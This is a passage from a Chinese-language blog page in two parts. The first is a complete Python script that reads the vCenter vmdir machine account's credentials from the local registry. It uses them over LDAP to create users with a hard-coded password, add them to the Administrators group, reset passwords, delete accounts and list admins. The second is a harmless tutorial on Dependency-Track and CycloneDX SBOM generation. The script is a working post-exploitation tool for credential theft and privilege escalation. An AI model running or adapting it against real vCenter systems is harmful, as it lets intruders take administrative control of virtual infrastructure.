class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunCommand</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    r = os.popen(cmd)</span><br><span class="line">    text = r.read()</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLDAPConfig</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the config of LDAP&quot;</span>)</span><br><span class="line">    result = RunCommand(<span class="string">&quot;/opt/likewise/bin/lwregshell list_values &#x27;[HKEY_THIS_MACHINE\\services\\vmdir]&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccount&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">    dcAccount = pattern.findall(result)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccountDN&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">    dcAccountDN = pattern.findall(result)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccountPassword&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">    dcAccountPassword = pattern.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;$&quot;</span>, <span class="string">&#x27;\\$&#x27;</span>).replace(<span class="string">&quot;`&quot;</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccount: &quot;</span> + dcAccount)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccountDN: &quot;</span> + dcAccountDN)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] dcAccountPassword: &quot;</span> + dcAccountPassword)</span><br><span class="line">    <span class="keyword">return</span> dcAccount,dcAccountDN,dcAccountPassword</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   username: test1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   userPrincipalName: test1@AAA.BBB&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;input the new username: &quot;</span>)</span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the dn: &quot;</span>)</span><br><span class="line">    userPrincipalName = <span class="built_in">input</span>(<span class="string">&quot;input the userPrincipalName: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    ADDUSER = <span class="string">&#x27;&#x27;&#x27;dn: &#123;dn&#125;</span></span><br><span class="line"><span class="string">userPrincipalName: &#123;userPrincipalName&#125;</span></span><br><span class="line"><span class="string">sAMAccountName: &#123;username&#125;</span></span><br><span class="line"><span class="string">cn: &#123;username&#125;</span></span><br><span class="line"><span class="string">objectClass: top</span></span><br><span class="line"><span class="string">objectClass: person</span></span><br><span class="line"><span class="string">objectClass: organizationalPerson</span></span><br><span class="line"><span class="string">objectClass: user</span></span><br><span class="line"><span class="string">userPassword: P@ssWord123@@</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    ADDUSER = ADDUSER.<span class="built_in">format</span>(dn = dn, userPrincipalName = userPrincipalName, username = username) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ADDUSER)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;adduser.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(ADDUSER)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapadd -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f adduser.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;adduser.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] New user: &quot;</span> + userPrincipalName)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    Password: P@ssWord123@@&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Remember to add it as an admin&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddAdmin</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    ADDADMIN = <span class="string">&#x27;&#x27;&#x27;dn: cn=Administrators,cn=Builtin,&#123;base&#125;</span></span><br><span class="line"><span class="string">changetype: modify</span></span><br><span class="line"><span class="string">add: member</span></span><br><span class="line"><span class="string">member: &#123;dn&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    ADDADMIN = ADDADMIN.<span class="built_in">format</span>(base = base, dn = dn) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ADDADMIN)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;addadmin.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(ADDADMIN)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to modify the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapmodify -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f addadmin.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;addadmin.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangePass</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   new password: P@ssWord123@@45&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line">    newpassword = <span class="built_in">input</span>(<span class="string">&quot;input the new password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    CHANGEPASS = <span class="string">&#x27;&#x27;&#x27;dn: &#123;dn&#125;</span></span><br><span class="line"><span class="string">changetype: modify</span></span><br><span class="line"><span class="string">replace: userPassword</span></span><br><span class="line"><span class="string">userPassword: &#123;newpassword&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    CHANGEPASS = CHANGEPASS.<span class="built_in">format</span>(dn = dn, newpassword = newpassword) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(CHANGEPASS)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;changepass.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(CHANGEPASS)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to modify the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapmodify -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f changepass.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;changepass.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] User: &quot;</span> + dn)    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] New Password: &quot;</span> + newpassword)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to input the user dn&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to delete the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapdelete -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; \&quot;&#123;dn&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, dn = dn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetAdmin</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    adminbase = <span class="string">&quot;cn=Administrators,cn=Builtin,&quot;</span> + base</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapsearch -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -b \&quot;&#123;adminbase&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Admin User:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern_name = re.<span class="built_in">compile</span>(<span class="string">r&quot;member: (.*?),&quot;</span>)</span><br><span class="line">    name = pattern_name.findall(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name)):       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; -  %s&quot;</span>%(name[i][<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    adminbase = <span class="string">&quot;cn=Users,&quot;</span> + base</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapsearch -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -b \&quot;&#123;adminbase&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] User:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern_name = re.<span class="built_in">compile</span>(<span class="string">r&quot;dn: (.*?),&quot;</span>)</span><br><span class="line">    name = pattern_name.findall(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name)):       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; -  %s&quot;</span>%(name[i][<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;vCenterLDAP_Manage.py&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Use to manage the LDAP database.&quot;</span>)       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s &lt;mode&gt;&quot;</span>%(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mode:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- adduser&quot;</span>)        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- addadmin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- changepass&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- deleteuser&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- getadmin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- getuser&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s adduser&quot;</span>%(sys.argv[<span class="number">0</span>]))      </span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;adduser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add a user&quot;</span>)</span><br><span class="line">            AddUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;addadmin&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add a user as an admin&quot;</span>)</span><br><span class="line">            AddAdmin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;changepass&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to change the password&quot;</span>)</span><br><span class="line">            ChangePass()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;deleteuser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to delete the user&quot;</span>)</span><br><span class="line">            DeleteUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;getadmin&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to list the admin user&quot;</span>)</span><br><span class="line">            GetAdmin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;getuser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to list the user&quot;</span>)</span><br><span class="line">            GetUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Wrong parameter&quot;</span>)</span><br></pre></td></tr></table></figure>






      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vCenter/" rel="tag">vCenter</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-SCA-Dependency-track使用研究" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/" class="article-date">
  	<time datetime="2022-04-20T01:15:54.000Z" itemprop="datePublished">2022-04-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/20/SCA-Dependency-track%E4%BD%BF%E7%94%A8%E7%A0%94%E7%A9%B6/">
        SCA-Dependency-track使用研究
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-官方说明书"><a href="#1-官方说明书" class="headerlink" title="1.官方说明书"></a>1.官方说明书</h2><p><a target="_blank" rel="noopener" href="https://docs.dependencytrack.org/getting-started/openidconnect-configuration/">https://docs.dependencytrack.org/getting-started/openidconnect-configuration/</a></p>
<h2 id="2-安装Dependency-track"><a href="#2-安装Dependency-track" class="headerlink" title="2.安装Dependency-track"></a>2.安装Dependency-track</h2><p>一、安装/初始化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://dependencytrack.org/docker-compose.yml</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>创建并使用宿主机上的存储以避免数据丢失：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker volume create --name dependency-track</span><br><span class="line">DependencyTrackdocker run -d -m 8192m -p 8080:8080 --name dependency-track -v dependency-track:/data owasp/dependency-track</span><br></pre></td></tr></table></figure>

<p>二、数据库</p>
<p>Dependency-Track 会默认启用嵌入式 H2 数据库。 该数据库的主要是用于对平台的快速评估、测试和演示。 也支持以下3种数据库，在实际生产环境中可参考配置文件配置。<br>Dependency-Track 支持以下数据库服务器：<br>Microsoft SQL Server 2012 及更高版本<br>MySQL 5.6 和 5.7<br>PostgreSQL 9.0 及更高版本<br>参考：<a target="_blank" rel="noopener" href="https://docs.dependencytrack.org/getting-started/database-support/">https://docs.dependencytrack.org/getting-started/database-support/</a></p>
<h2 id="3-Dependency-track原理"><a href="#3-Dependency-track原理" class="headerlink" title="3.Dependency-track原理"></a>3.Dependency-track原理</h2><p>DependencyTrack是第三方组件安全检测和管理平台，它接收调用者提供的Software BOM(软件物料清单)，然后检查物料清单中的各个组件(以及当前清单中的版本)在漏洞数据库中是否存在已知安全漏洞的记录，并通过Dashboard展示出来。</p>
<p>1、准备好一份SBOM清单<br>2、发送给Dependency-track<br>3、在Dependency-track的管理界面上查看结果</p>
<p>SBOM(Software Bill of Material)中文名叫软件物料清单，这个SBOM清单里就有你的应用程序所依赖的所有第三方组件的信息(当然还有第三方组件的第三方组件)。</p>
<h2 id="4-使用工具生成SBOM"><a href="#4-使用工具生成SBOM" class="headerlink" title="4.使用工具生成SBOM"></a>4.使用工具生成SBOM</h2><p>构建工具支持，<a target="_blank" rel="noopener" href="https://cyclonedx.org/tool-center/">https://cyclonedx.org/tool-center/</a><br>插件支持：<a target="_blank" rel="noopener" href="https://github.com/orgs/CycloneDX/repositories">https://github.com/orgs/CycloneDX/repositories</a><br>Gradle用的cyclonedx-gradle-plugin<br>maven用的cyclonedx-maven-plugin<br>Node.js<br><a target="_blank" rel="noopener" href="https://www.npmjs.com/package/@cyclonedx/bom">https://www.npmjs.com/package/@cyclonedx/bom</a><br>Python<br><a target="_blank" rel="noopener" href="https://pypi.org/project/cyclonedx-bom/">https://pypi.org/project/cyclonedx-bom/</a></p>
<h2 id="5-安装方式"><a href="#5-安装方式" class="headerlink" title="5.安装方式"></a>5.安装方式</h2><p>以Maven项目示例，其他项目应该也差不多，国内几乎没有关于这个的资料……..<br>1.Maven<br><a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.cyclonedx/cyclonedx-maven-plugin/2.5.3">https://mvnrepository.com/artifact/org.cyclonedx/cyclonedx-maven-plugin/2.5.3</a></p>
<p>Github上随便下载了一个项目来做测试=.=</p>
<p>第一步，在maven项目的pom.xml中添加<dependency></dependency></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.cyclonedx/cyclonedx-maven-plugin --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.cyclonedx&lt;/groupId&gt;  &lt;artifactId&gt;cyclonedx-maven-plugin&lt;/artifactId&gt;  &lt;version&gt;2.5.3&lt;/version&gt;&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步，在maven项目的pom.xml中添加<plugin></plugin></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugins&gt;  &lt;plugin&gt;    &lt;groupId&gt;org.cyclonedx&lt;/groupId&gt;    &lt;artifactId&gt;cyclonedx-maven-plugin&lt;/artifactId&gt;    &lt;version&gt;<span class="number">2.5</span><span class="number">.3</span>&lt;/version&gt;    &lt;executions&gt;      &lt;execution&gt;        &lt;phase&gt;<span class="keyword">package</span>&lt;/phase&gt;        &lt;goals&gt;          &lt;goal&gt;makeAggregateBom&lt;/goal&gt;        &lt;/goals&gt;      &lt;/execution&gt;    &lt;/executions&gt;    &lt;configuration&gt;      &lt;projectType&gt;library&lt;/projectType&gt;      &lt;schemaVersion&gt;<span class="number">1.3</span>&lt;/schemaVersion&gt;      &lt;includeBomSerialNumber&gt;<span class="keyword">true</span>&lt;/includeBomSerialNumber&gt;      &lt;includeCompileScope&gt;<span class="keyword">true</span>&lt;/includeCompileScope&gt;      &lt;includeProvidedScope&gt;<span class="keyword">true</span>&lt;/includeProvidedScope&gt;      &lt;includeRuntimeScope&gt;<span class="keyword">true</span>&lt;/includeRuntimeScope&gt;      &lt;includeSystemScope&gt;<span class="keyword">true</span>&lt;/includeSystemScope&gt;      &lt;includeTestScope&gt;<span class="keyword">false</span>&lt;/includeTestScope&gt;      &lt;includeLicenseText&gt;<span class="keyword">false</span>&lt;/includeLicenseText&gt;      &lt;outputFormat&gt;all&lt;/outputFormat&gt;      &lt;outputName&gt;bom&lt;/outputName&gt;    &lt;/configuration&gt;  &lt;/plugin&gt;&lt;/plugins&gt;</span><br></pre></td></tr></table></figure>


<p>第三步，mvn package项目，然后在target里面会生成bom.json和bom.xml将其上传到dependencytrack，github随便找了一个项目示例pom修改</p>
